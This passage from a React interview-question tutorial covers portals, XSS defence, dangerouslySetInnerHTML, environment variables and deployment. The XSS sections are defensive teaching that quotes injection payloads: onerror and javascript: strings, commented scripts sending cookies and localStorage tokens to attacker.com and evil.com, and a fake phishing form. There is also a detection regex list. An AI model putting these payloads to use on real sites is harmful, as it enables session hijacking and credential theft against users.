      <div ref={triggerRef} onClick={toggle}>
        {trigger}
      </div>
      
      {isOpen && createPortal(
        <div
          className="dropdown"
          style={{
            position: 'absolute',
            left: position.x,
            top: position.y,
            zIndex: 1000
          }}
        >
          {children}
        </div>,
        document.body
      )}
    </>
  );
}

// Usage
function App() {
  return (
    <div>
      <Dropdown trigger={<button>Menu</button>}>
        <ul>
          <li>Profile</li>
          <li>Settings</li>
          <li>Logout</li>
        </ul>
      </Dropdown>
    </div>
  );
}

Toast Notifications with Portal:
---------------------------------

const ToastContext = createContext();

function ToastProvider({ children }) {
  const [toasts, setToasts] = useState([]);
  
  const addToast = useCallback((message, type = 'info') => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message, type }]);
    
    // Auto remove after 3 seconds
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 3000);
  }, []);
  
  return (
    <ToastContext.Provider value={{ addToast }}>
      {children}
      
      {createPortal(
        <div className="toast-container">
          {toasts.map(toast => (
            <div key={toast.id} className={`toast toast-${toast.type}`}>
              {toast.message}
            </div>
          ))}
        </div>,
        document.body
      )}
    </ToastContext.Provider>
  );
}

function useToast() {
  const context = useContext(ToastContext);
  if (!context) {
    throw new Error('useToast must be used within ToastProvider');
  }
  return context;
}

// Usage
function App() {
  return (
    <ToastProvider>
      <MyApp />
    </ToastProvider>
  );
}

function MyApp() {
  const { addToast } = useToast();
  
  return (
    <div>
      <button onClick={() => addToast('Success!', 'success')}>
        Show Success
      </button>
      <button onClick={() => addToast('Error!', 'error')}>
        Show Error
      </button>
    </div>
  );
}

Event Bubbling with Portals:
-----------------------------

// Events bubble through React tree, not DOM tree!

function App() {
  const handleClick = () => {
    console.log('Parent clicked!');
  };
  
  return (
    <div onClick={handleClick}>
      <ModalWithPortal>
        <button>Click me</button>
        {/* Clicking button triggers parent's onClick * /}
        {/* Even though modal is rendered outside parent in DOM * /}
      </ModalWithPortal>
    </div>
  );
}

// This is useful! Events work as expected in React tree

When to Use Portals:
--------------------

// ✅ Use Portals for:

// 1. Modals and dialogs
// Need to render above everything else
createPortal(<Modal />, document.body);

// 2. Tooltips and popovers
// Need to escape parent overflow/z-index
createPortal(<Tooltip />, document.body);

// 3. Dropdowns and menus
// Need absolute positioning from body
createPortal(<Dropdown />, document.body);

// 4. Toast notifications
// Need fixed position at screen edge
createPortal(<Toast />, document.body);

// 5. Full-screen overlays
// Cover entire viewport
createPortal(<Overlay />, document.body);

// ❌ Don't use Portals for:

// 1. Regular content
// Just use normal React rendering

// 2. Simple conditional rendering
// if/else or && operator sufficient

// 3. Components that don't need DOM independence
// No styling or z-index issues

Summary:

React Portal:
- Render children outside parent DOM hierarchy
- Use createPortal(children, domNode)
- Events bubble through React tree
- Perfect for modals, tooltips, dropdowns
- Solves CSS overflow/z-index issues
- Maintains React component hierarchy
- Common pattern for UI overlays
*/




/**
103. What is Cross-Site Scripting (XSS) in React and how do you prevent it?
---------------------------------------------------------------------------

Cross-Site Scripting (XSS) is a security vulnerability where attackers inject
malicious scripts into web pages. React has built-in protection, but there
are still ways to introduce XSS vulnerabilities if you're not careful.

What is XSS:
------------

// XSS occurs when untrusted data is inserted into the DOM
// Attacker injects malicious code that executes in victim's browser

// Example attack:
// User enters: <img src="x" onerror="alert('XSS!')">
// If rendered as HTML, the script executes
// Attacker can steal cookies, tokens, or perform actions as user

React's Built-in XSS Protection:
---------------------------------

// React escapes values by default [web:182][web:185]
function Component() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ✅ SAFE - React escapes the string [web:182][web:185]
  return <div>{userInput}</div>;
  
  // Rendered as text, not HTML:
  // <div>&lt;img src="x" onerror="alert('XSS')"&gt;</div>
}

// React automatically escapes:
// - Text content in JSX
// - Attribute values
// This prevents XSS through normal data binding [web:182]

XSS Vulnerabilities in React:
------------------------------

// 1. dangerouslySetInnerHTML (DANGEROUS!)
function Vulnerable() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ❌ VULNERABLE - Renders as HTML [web:181]
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  
  // Script executes! User compromised!
}

// 2. href with javascript: protocol [web:181][web:183]
function VulnerableLink() {
  const userUrl = "javascript:alert('XSS')";
  
  // ❌ VULNERABLE - Executes JavaScript
  return <a href={userUrl}>Click me</a>;
}

// 3. Creating elements from user input
function VulnerableElement() {
  const userTag = 'img';
  const userProps = { src: 'x', onerror: 'alert("XSS")' };
  
  // ❌ VULNERABLE
  return React.createElement(userTag, userProps);
}

// 4. eval or Function constructor [web:183]
function VulnerableCode() {
  const userCode = 'alert("XSS")';
  
  // ❌ NEVER DO THIS
  eval(userCode);
  new Function(userCode)();
}

// 5. Inline event handlers from user input [web:183]
function VulnerableHandler() {
  const userHandler = 'alert("XSS")';
  
  // ❌ VULNERABLE
  return <button onClick={eval(userHandler)}>Click</button>;
}

XSS Prevention Strategies:
---------------------------

// 1. Use JSX data binding (default protection) [web:185]
function Safe() {
  const userInput = '<script>alert("XSS")</script>';
  
  // ✅ SAFE - React escapes [web:182][web:185]
  return <div>{userInput}</div>;
  
  // Renders as text, not executable
}

// 2. Sanitize HTML before using dangerouslySetInnerHTML [web:181][web:183]
import DOMPurify from 'dompurify';

function SafeHTML() {
  const userHTML = '<img src="x" onerror="alert(\'XSS\')">';
  
  // ✅ SAFE - Sanitized [web:181][web:183]
  const cleanHTML = DOMPurify.sanitize(userHTML);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
  
  // DOMPurify removes malicious code
  // Result: <img src="x">
}

// 3. Validate URLs [web:181][web:183]
function SafeLink() {
  const userUrl = "javascript:alert('XSS')";
  
  // ✅ SAFE - Validate protocol [web:183]
  const isValidUrl = (url) => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };
  
  return (
    <a href={isValidUrl(userUrl) ? userUrl : '#'}>
      Click me
    </a>
  );
}

// Better: Use allowlist [web:183]
function SaferLink({ url }) {
  const safeUrl = url.startsWith('http://') || url.startsWith('https://')
    ? url
    : `https://${url}`;
  
  return <a href={safeUrl}>Link</a>;
}

// 4. Never use eval or Function [web:183]
function Safe() {
  const userCode = 'malicious code';
  
  // ❌ NEVER
  // eval(userCode);
  // new Function(userCode)();
  
  // ✅ Use safe alternatives
  // - JSON.parse for data
  // - Proper event handlers for functions
}

// 5. Use safe alternatives to dangerouslySetInnerHTML
import ReactMarkdown from 'react-markdown';

function SafeMarkdown() {
  const userMarkdown = '# Hello\n[Click](javascript:alert("XSS"))';
  
  // ✅ SAFE - ReactMarkdown sanitizes [web:183]
  return (
    <ReactMarkdown
      components={{
        // Customize rendering
        a: ({node, ...props}) => {
          // Only allow safe URLs
          if (props.href.startsWith('http')) {
            return <a {...props} />;
          }
          return <span>{props.children}</span>;
        }
      }}
    >
      {userMarkdown}
    </ReactMarkdown>
  );
}

Content Security Policy (CSP):
-------------------------------

// Add CSP headers to prevent XSS [web:181][web:183]

// Server configuration (Express example):
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'"
  );
  next();
});

// Or in HTML meta tag:
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; script-src 'self'">

// CSP prevents:
// - Inline scripts [web:183]
// - eval() execution
// - External script loading from untrusted sources

Input Validation and Sanitization:
-----------------------------------

// 1. Server-side validation (primary defense) [web:181]
// ALWAYS validate on server, never trust client

// 2. Client-side validation (user experience)
function CommentForm() {
  const [comment, setComment] = useState('');
  const [error, setError] = useState('');
  
  const validateComment = (value) => {
    // Check for suspicious patterns
    const suspiciousPatterns = [
      /<script/i,
      /javascript:/i,
      /onerror=/i,
      /onclick=/i,
      /onload=/i
    ];
    
    for (const pattern of suspiciousPatterns) {
      if (pattern.test(value)) {
        return 'Invalid input detected';
      }
    }
    
    return '';
  };
  
  const handleChange = (e) => {
    const value = e.target.value;
    setComment(value);
    setError(validateComment(value));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const validationError = validateComment(comment);
    if (validationError) {
      setError(validationError);
      return;
    }
    
    // Still validate on server!
    submitComment(comment);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={handleChange}
        placeholder="Enter comment"
      />
      {error && <div className="error">{error}</div>}
      <button type="submit" disabled={!!error}>
        Submit
      </button>
    </form>
  );
}

// 3. Whitelist approach [web:183]
function SafeInput() {
  const [input, setInput] = useState('');
  
  const sanitizeInput = (value) => {
    // Only allow alphanumeric and basic punctuation
    return value.replace(/[^a-zA-Z0-9\s.,!?-]/g, '');
  };
  
  const handleChange = (e) => {
    setInput(sanitizeInput(e.target.value));
  };
  
  return <input value={input} onChange={handleChange} />;
}

Real-World Example - Blog Comments:
------------------------------------

import DOMPurify from 'dompurify';

function Comment({ text, author, html }) {
  // ✅ SAFE - Plain text rendered safely
  return (
    <div className="comment">
      <div className="author">{author}</div>
      <div className="text">{text}</div>
    </div>
  );
}

function RichComment({ html, author }) {
  // For rich text (Markdown, WYSIWYG editors)
  
  // ✅ SAFE - Sanitize before rendering [web:181][web:183]
  const sanitizedHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only http/https
  });
  
  return (
    <div className="comment">
      <div className="author">{author}</div>
      <div
        className="text"
        dangerouslySetInnerHTML={{ __html: sanitizedHTML }}
      />
    </div>
  );
}

function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <Comment
          key={comment.id}
          text={comment.text}
          author={comment.author}
        />
      ))}
    </div>
  );
}

Best Practices Checklist:
--------------------------

// ✅ DO:
// 1. Use JSX data binding by default [web:185]
<div>{userInput}</div>

// 2. Sanitize HTML with DOMPurify [web:181][web:183]
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

// 3. Validate URLs [web:183]
const safeUrl = validateUrl(userUrl);

// 4. Use CSP headers [web:181][web:183]
Content-Security-Policy: default-src 'self'

// 5. Validate input (client and server) [web:181]
if (!validateInput(data)) return;

// 6. Use safe libraries (ReactMarkdown, etc.) [web:183]

// ❌ DON'T:
// 1. Never use dangerouslySetInnerHTML with unsanitized input [web:181]
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // NEVER!

// 2. Never use eval or Function [web:183]
eval(userCode);  // NEVER!

// 3. Don't trust client-side validation alone [web:181]
// Always validate on server

// 4. Don't allow javascript: URLs [web:181][web:183]
<a href={userUrl}>  // Validate first!

// 5. Don't create elements from user input
React.createElement(userTag, userProps);  // NEVER!

Summary:

XSS in React:
- React escapes by default [web:182][web:185]
- Still vulnerable with dangerouslySetInnerHTML [web:181]
- Validate and sanitize user input [web:181][web:183]
- Use DOMPurify for HTML [web:181][web:183]
- Validate URLs [web:183]
- Never use eval [web:183]
- Implement CSP headers [web:181][web:183]
- Always validate server-side [web:181]
*/


/**
104. What is dangerouslySetInnerHTML and why should you avoid it?
----------------------------------------------------------------

dangerouslySetInnerHTML is React's replacement for innerHTML in the DOM.
It allows you to set HTML directly from React, but the name warns you
of the security risks involved.

What is dangerouslySetInnerHTML:
---------------------------------

// React's way to set innerHTML [web:181]
function Component() {
  const htmlString = '<p>Hello <strong>World</strong></p>';
  
  // Setting HTML directly
  return (
    <div dangerouslySetInnerHTML={{ __html: htmlString }} />
  );
  
  // Renders as HTML:
  // <div>
  //   <p>Hello <strong>World</strong></p>
  // </div>
}

// Must use object with __html key
// The awkward syntax is intentional - makes you think twice!

Why It's Called "Dangerous":
-----------------------------

// It bypasses React's XSS protection [web:181][web:182]

// Safe (normal JSX):
function Safe() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  return <div>{userInput}</div>;
  
  // React escapes it:
  // <div>&lt;img src="x" onerror="alert('XSS')"&gt;</div>
  // Shown as text, not executed
}

// Dangerous:
function Dangerous() {
  const userInput = '<img src="x" onerror="alert(\'XSS\')">';
  
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  
  // Renders as actual HTML:
  // <div><img src="x" onerror="alert('XSS')"></div>
  // Script EXECUTES! ⚠️
}

Security Risks:
---------------

// 1. XSS Attacks [web:181]
function VulnerableComponent({ commentHTML }) {
  // If commentHTML comes from user input...
  // ❌ VULNERABLE
  return <div dangerouslySetInnerHTML={{ __html: commentHTML }} />;
  
  // Attacker can inject:
  // <script>
  //   // Steal cookies
  //   fetch('https://attacker.com/steal', {
  //     method: 'POST',
  //     body: document.cookie
  //   });
  // </script>
  
  // Or:
  // <img src="x" onerror="
  //   fetch('/api/delete-account', { method: 'DELETE' })
  // ">
}

// 2. Session Hijacking
function Comment({ html }) {
  // ❌ DANGEROUS
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  
  // Attacker injects:
  // <script>
  //   const token = localStorage.getItem('auth-token');
  //   fetch('https://evil.com/steal?token=' + token);
  // </script>
}

// 3. Phishing
function Article({ content }) {
  // ❌ DANGEROUS
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
  
  // Attacker injects fake login form:
  // <form action="https://evil.com/phish" method="POST">
  //   <input name="password" placeholder="Re-enter password">
  //   <button>Continue</button>
  // </form>
}

When You Might Need It:
-----------------------

// 1. Rendering HTML from trusted CMS
function CMSContent({ html }) {
  // If HTML comes from trusted admin-only CMS
  // Still sanitize! [web:181]
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 2. Rendering sanitized Markdown
function MarkdownContent({ markdown }) {
  // Convert markdown to HTML
  const html = marked(markdown);
  
  // Sanitize [web:181]
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 3. Embedding third-party widgets
function YouTubeEmbed({ videoId }) {
  const embedHTML = `
    <iframe
      width="560"
      height="315"
      src="https://www.youtube.com/embed/${videoId}"
      frameborder="0"
      allowfullscreen
    ></iframe>
  `;
  
  return <div dangerouslySetInnerHTML={{ __html: embedHTML }} />;
}

Safe Alternatives:
------------------

// 1. Use JSX instead [web:185]
// ❌ Don't do this:
function Bad() {
  const html = '<p>Hello <strong>World</strong></p>';
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
function Good() {
  return (
    <div>
      <p>Hello <strong>World</strong></p>
    </div>
  );
}

// 2. Use React components for rich text
// ❌ Don't do this:
function BlogPost({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
import ReactMarkdown from 'react-markdown';

function BlogPost({ markdown }) {
  return <ReactMarkdown>{markdown}</ReactMarkdown>;
}

// 3. Parse and render safely
// ❌ Don't do this:
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Do this:
import parse from 'html-react-parser';

function Comment({ html }) {
  // Parses HTML to React elements
  return <div>{parse(html)}</div>;
}

Proper Sanitization:
--------------------

// Always sanitize before using dangerouslySetInnerHTML [web:181][web:183]

import DOMPurify from 'dompurify';

// Basic sanitization
function SafeHTML({ html }) {
  const cleanHTML = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// Custom sanitization options [web:181]
function CustomSanitizedHTML({ html }) {
  const cleanHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only http/https URLs
  });
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// Strict sanitization (text only)
function TextOnly({ html }) {
  const textOnly = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [],  // No HTML tags
    ALLOWED_ATTR: []
  });
  
  return <div dangerouslySetInnerHTML={{ __html: textOnly }} />;
}

// Remove all scripts and event handlers [web:183]
function NoScripts({ html }) {
  const safe = DOMPurify.sanitize(html, {
    FORBID_TAGS: ['script', 'style'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: safe }} />;
}

Real-World Example - Rich Text Editor:
---------------------------------------

import DOMPurify from 'dompurify';

function RichTextEditor() {
  const [content, setContent] = useState('');
  const [preview, setPreview] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    setContent(value);
    
    // Sanitize for preview [web:181]
    const sanitized = DOMPurify.sanitize(value, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
        'ul', 'ol', 'li', 'a', 'blockquote', 'code', 'pre'
      ],
      ALLOWED_ATTR: ['href', 'title'],
      ALLOWED_URI_REGEXP: /^https?:\/\//
    });
    
    setPreview(sanitized);
  };
  
  const handleSubmit = async () => {
    // Sanitize again before sending to server [web:181]
    const sanitized = DOMPurify.sanitize(content);
    
    await fetch('/api/posts', {
      method: 'POST',
      body: JSON.stringify({ content: sanitized }),
      headers: { 'Content-Type': 'application/json' }
    });
  };
  
  return (
    <div>
      <textarea
        value={content}
        onChange={handleChange}
        placeholder="Write your post..."
      />
      
      <div className="preview">
        <h3>Preview:</h3>
        <div dangerouslySetInnerHTML={{ __html: preview }} />
      </div>
      
      <button onClick={handleSubmit}>Publish</button>
    </div>
  );
}

Testing for XSS:
----------------

// Test your sanitization
describe('HTML Sanitization', () => {
  it('removes script tags', () => {
    const malicious = '<script>alert("XSS")</script><p>Hello</p>';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('<script>');
    expect(clean).toContain('<p>Hello</p>');
  });
  
  it('removes event handlers', () => {
    const malicious = '<img src="x" onerror="alert(\'XSS\')">';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('onerror');
  });
  
  it('removes javascript: URLs', () => {
    const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
    const clean = DOMPurify.sanitize(malicious);
    
    expect(clean).not.toContain('javascript:');
  });
  
  it('allows safe HTML', () => {
    const safe = '<p>Hello <strong>World</strong></p>';
    const clean = DOMPurify.sanitize(safe);
    
    expect(clean).toBe(safe);
  });
});

Best Practices:
---------------

// 1. Avoid if possible [web:181]
// Use JSX or safe libraries instead

// 2. Always sanitize [web:181][web:183]
const clean = DOMPurify.sanitize(html);
<div dangerouslySetInnerHTML={{ __html: clean }} />

// 3. Use strict allowlist [web:183]
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'strong', 'em'],
  ALLOWED_ATTR: []
});

// 4. Never trust user input [web:181]
// Even from authenticated users

// 5. Sanitize on server too [web:181]
// Defense in depth

// 6. Use Content Security Policy [web:183]
// Additional protection layer

// 7. Regular security audits
// Test for XSS vulnerabilities

Why Avoid It:
-------------

// 1. Security risk [web:181]
// XSS attacks can steal data, hijack sessions

// 2. React protection bypassed [web:182]
// Lose React's automatic escaping

// 3. Hard to maintain
// Easy to forget sanitization

// 4. Better alternatives exist
// ReactMarkdown, html-react-parser, etc.

// 5. Performance
// Parsing HTML is slower than JSX

// 6. Accessibility
// Harder to ensure semantic HTML

Summary:

dangerouslySetInnerHTML:
- React's innerHTML equivalent
- Bypasses XSS protection [web:181][web:182]
- Name warns of danger
- Use only when necessary
- Always sanitize with DOMPurify [web:181][web:183]
- Prefer safe alternatives [web:185]
- Never trust user input [web:181]
- Use strict allowlists [web:183]
- Test for XSS vulnerabilities
*/


/**
105. What are environment variables in React?
--------------------------------------------

Environment variables are external configuration values used to store settings
that differ between development, staging, and production environments without
changing code. In React (Create React App), they must be prefixed with
REACT_APP_.

Basic Environment Variables:
-----------------------------

// .env file in project root
REACT_APP_API_URL=https://api.example.com
REACT_APP_API_KEY=your-api-key-here
REACT_APP_ENVIRONMENT=development

// Access in React code
function App() {
  const apiUrl = process.env.REACT_APP_API_URL;
  const apiKey = process.env.REACT_APP_API_KEY;
  const env = process.env.REACT_APP_ENVIRONMENT;
  
  console.log('API URL:', apiUrl);
  console.log('Environment:', env);
  
  return <div>Environment: {env}</div>;
}

// Important: Must start with REACT_APP_
// REACT_APP_MY_VAR ✅ Works
// MY_VAR ❌ Doesn't work

Different Environment Files:
-----------------------------

// .env - Default, loaded in all environments
REACT_APP_APP_NAME=My App

// .env.local - Local overrides, ignored by git
REACT_APP_API_KEY=dev-key-12345

// .env.development - Development only
REACT_APP_API_URL=http://localhost:3001
REACT_APP_DEBUG=true

// .env.production - Production only
REACT_APP_API_URL=https://api.production.com
REACT_APP_DEBUG=false

// .env.test - Test environment
REACT_APP_API_URL=http://localhost:3001
REACT_APP_DEBUG=false

// Priority (highest to lowest):
// 1. .env.local
// 2. .env.development / .env.production / .env.test
// 3. .env

Common Use Cases:
-----------------

// 1. API URLs
const API_URL = process.env.REACT_APP_API_URL;

function fetchUsers() {
  return fetch(`${API_URL}/users`);
}

// Development: http://localhost:3001/users
// Production: https://api.production.com/users

// 2. Feature flags
const ENABLE_ANALYTICS = process.env.REACT_APP_ENABLE_ANALYTICS === 'true';

function App() {
  useEffect(() => {
    if (ENABLE_ANALYTICS) {
      initializeAnalytics();
    }
  }, []);
  
  return <div>App</div>;
}

// 3. API keys (external services)
const GOOGLE_MAPS_KEY = process.env.REACT_APP_GOOGLE_MAPS_KEY;

function Map() {
  return (
    <GoogleMap apiKey={GOOGLE_MAPS_KEY}>
      {/* Map content * /}
    </GoogleMap>
  );
}

// 4. Environment-specific behavior
const IS_DEV = process.env.NODE_ENV === 'development';
const IS_PROD = process.env.NODE_ENV === 'production';

function logger(message) {
  if (IS_DEV) {
    console.log(message);
  }
  
  if (IS_PROD) {
    sendToLogService(message);
  }
}

// 5. Build-time configuration
const VERSION = process.env.REACT_APP_VERSION || '1.0.0';
const BUILD_DATE = process.env.REACT_APP_BUILD_DATE;

function Footer() {
  return (
    <footer>
      Version {VERSION} - Built on {BUILD_DATE}
    </footer>
  );
}

Configuration Module Pattern:
------------------------------

// config.js
const config = {
  apiUrl: process.env.REACT_APP_API_URL,
  apiKey: process.env.REACT_APP_API_KEY,
  environment: process.env.REACT_APP_ENVIRONMENT,
  features: {
    analytics: process.env.REACT_APP_ENABLE_ANALYTICS === 'true',
    betaFeatures: process.env.REACT_APP_BETA_FEATURES === 'true',
  },
  external: {
    googleMapsKey: process.env.REACT_APP_GOOGLE_MAPS_KEY,
    stripeKey: process.env.REACT_APP_STRIPE_KEY,
  }
};

export default config;

// Usage
import config from './config';

function App() {
  const { apiUrl, features } = config;
  
  useEffect(() => {
    if (features.analytics) {
      setupAnalytics();
    }
  }, []);
  
  return <div>API: {apiUrl}</div>;
}

Vite Environment Variables:
----------------------------

// Vite uses different prefix: VITE_

// .env
VITE_API_URL=https://api.example.com
VITE_API_KEY=your-key

// Access in code
function App() {
  const apiUrl = import.meta.env.VITE_API_URL;
  const apiKey = import.meta.env.VITE_API_KEY;
  const mode = import.meta.env.MODE; // 'development' or 'production'
  const isDev = import.meta.env.DEV; // boolean
  const isProd = import.meta.env.PROD; // boolean
  
  return <div>API: {apiUrl}</div>;
}

Security Considerations:
------------------------

// ⚠️ IMPORTANT: Environment variables are PUBLIC

// ❌ NEVER store secrets in React env vars
REACT_APP_DATABASE_PASSWORD=secret123  // ❌ EXPOSED IN BUNDLE!
REACT_APP_PRIVATE_KEY=abc123  // ❌ EXPOSED IN BUNDLE!

// Why? They're embedded in JavaScript bundle
// Anyone can read them in browser DevTools

// ✅ DO: Store non-sensitive config
REACT_APP_API_URL=https://api.example.com  // ✅ OK
REACT_APP_GOOGLE_MAPS_KEY=public-key  // ✅ OK (public API key)

// ✅ DO: Keep secrets on server
// Create API endpoint that uses secret server-side
// React calls endpoint, server uses secret

// Example: Stripe payments
// ❌ Bad: Expose secret key
const STRIPE_SECRET = process.env.REACT_APP_STRIPE_SECRET; // NEVER!

// ✅ Good: Use publishable key in React
const STRIPE_PUBLIC = process.env.REACT_APP_STRIPE_PUBLIC; // OK

// Server handles secret key
// POST /api/create-payment-intent
app.post('/api/create-payment-intent', async (req, res) => {
  const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
  // Use secret key server-side only
});

.gitignore Setup:
-----------------

// .gitignore
.env.local
.env.*.local

// Commit to git:
.env  // ✅ Template with dummy values
.env.development  // ✅ Safe development defaults
.env.production  // ✅ Safe production defaults (no secrets)

// Don't commit:
.env.local  // ❌ Contains actual keys/secrets

// .env (committed template)
REACT_APP_API_URL=
REACT_APP_GOOGLE_MAPS_KEY=

// .env.local (not committed, actual values)
REACT_APP_API_URL=https://api.example.com
REACT_APP_GOOGLE_MAPS_KEY=actual-key-here

TypeScript with Environment Variables:
---------------------------------------

// vite-env.d.ts or env.d.ts
interface ImportMetaEnv {
  readonly VITE_API_URL: string;
  readonly VITE_API_KEY: string;
  readonly VITE_ENVIRONMENT: 'development' | 'staging' | 'production';
}

interface ImportMeta {
  readonly env: ImportMetaEnv;
}

// Now get type checking
const apiUrl: string = import.meta.env.VITE_API_URL; // Type-safe!

// For Create React App
declare namespace NodeJS {
  interface ProcessEnv {
    REACT_APP_API_URL: string;
    REACT_APP_API_KEY: string;
    NODE_ENV: 'development' | 'production' | 'test';
  }
}

// Usage with type safety
const apiUrl: string = process.env.REACT_APP_API_URL;

Validation:
-----------

// Validate required environment variables
function validateEnv() {
  const required = [
    'REACT_APP_API_URL',
    'REACT_APP_API_KEY'
  ];
  
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    throw new Error(
      `Missing required environment variables: ${missing.join(', ')}`
    );
  }
}

// Call at app startup
validateEnv();

// Or use a library
import { z } from 'zod';

const envSchema = z.object({
  REACT_APP_API_URL: z.string().url(),
  REACT_APP_API_KEY: z.string().min(10),
  REACT_APP_ENVIRONMENT: z.enum(['development', 'staging', 'production'])
});

const env = envSchema.parse(process.env);

CI/CD Environment Variables:
-----------------------------

// GitHub Actions
// .github/workflows/deploy.yml
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        env:
          REACT_APP_API_URL: ${{ secrets.API_URL }}
          REACT_APP_API_KEY: ${{ secrets.API_KEY }}
        run: npm run build

// Netlify
// Set in Netlify dashboard or netlify.toml
[build.environment]
  REACT_APP_API_URL = "https://api.example.com"

// Vercel
// Set in Vercel dashboard or vercel.json
{
  "env": {
    "REACT_APP_API_URL": "https://api.example.com"
  }
}

Summary:

Environment Variables:
- Store configuration outside code
- Different values per environment
- Must prefix with REACT_APP_ (CRA) or VITE_ (Vite)
- Access via process.env or import.meta.env
- Embedded in JavaScript bundle (not secret!)
- Never store sensitive data
- Use .env.local for local secrets
- Validate at startup
- Set in CI/CD for deployment
*/


/**
106. How do you deploy a React app? (Netlify, Vercel, AWS, etc.)
----------------------------------------------------------------

React apps can be deployed to various platforms. The process typically involves
building the app to static files and serving them from a web server or CDN.

Build Process:
--------------

// 1. Build React app
npm run build

// Creates 'build' folder with:
build/
  index.html
  static/
    css/
      main.[hash].css
    js/
      main.[hash].js
    media/
      logo.[hash].png

// Optimized production files:
// - Minified JavaScript
// - Compressed CSS
// - Optimized images
// - Source maps (optional)

// 2. Test build locally
npx serve -s build

// 3. Deploy build folder to hosting platform

Netlify Deployment:
-------------------

// Method 1: Drag and Drop
// 1. Go to netlify.com
// 2. Drag 'build' folder to deploy area
// 3. Done! Gets URL like: https://random-name.netlify.app

// Method 2: Git Integration (Recommended)
// 1. Push code to GitHub
// 2. Connect repository in Netlify dashboard
// 3. Configure build settings:
//    - Build command: npm run build
//    - Publish directory: build
// 4. Auto-deploys on git push!

// netlify.toml (optional configuration)
[build]
  command = "npm run build"
  publish = "build"

[build.environment]
  REACT_APP_API_URL = "https://api.example.com"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200  # SPA redirect

// Method 3: Netlify CLI
npm install -g netlify-cli

// Login
netlify login

// Deploy
netlify deploy --prod

Vercel Deployment:
------------------

// Method 1: Vercel CLI
npm install -g vercel

// Login
vercel login

// Deploy
vercel

// Production deploy
vercel --prod

// Method 2: Git Integration (Recommended)
// 1. Push to GitHub
// 2. Import project in Vercel dashboard
// 3. Auto-deploys on push!

// vercel.json (optional)
{
  "buildCommand": "npm run build",
  "outputDirectory": "build",
  "devCommand": "npm start",
  "rewrites": [
    { "source": "/(.*)", "destination": "/" }
  ]
}

// Environment variables
// Set in Vercel dashboard:
// Settings > Environment Variables
REACT_APP_API_URL=https://api.example.com

// Or via CLI
vercel env add REACT_APP_API_URL production

GitHub Pages:
-------------

// 1. Install gh-pages
npm install --save-dev gh-pages

// 2. Add homepage to package.json
{
  "homepage": "https://username.github.io/repository-name",
  "scripts": {
    "predeploy": "npm run build",
    "deploy": "gh-pages -d build",
    "start": "react-scripts start",
    "build": "react-scripts build"
  }
}

// 3. Deploy
npm run deploy

// Creates gh-pages branch and deploys
// Available at: https://username.github.io/repository-name

// For custom domain:
// 1. Add CNAME file in public folder
echo "yourdomain.com" > public/CNAME

// 2. Configure DNS:
// A record: 185.199.108.153
// A record: 185.199.109.153
// A record: 185.199.110.153
// A record: 185.199.111.153

AWS S3 + CloudFront:
--------------------

// 1. Create S3 bucket
aws s3 mb s3://my-react-app

// 2. Configure bucket for static website
aws s3 website s3://my-react-app --index-document index.html --error-document index.html

// 3. Build app
npm run build

// 4. Upload build folder
aws s3 sync build/ s3://my-react-app --acl public-read

// 5. Create CloudFront distribution
// - Origin: S3 bucket
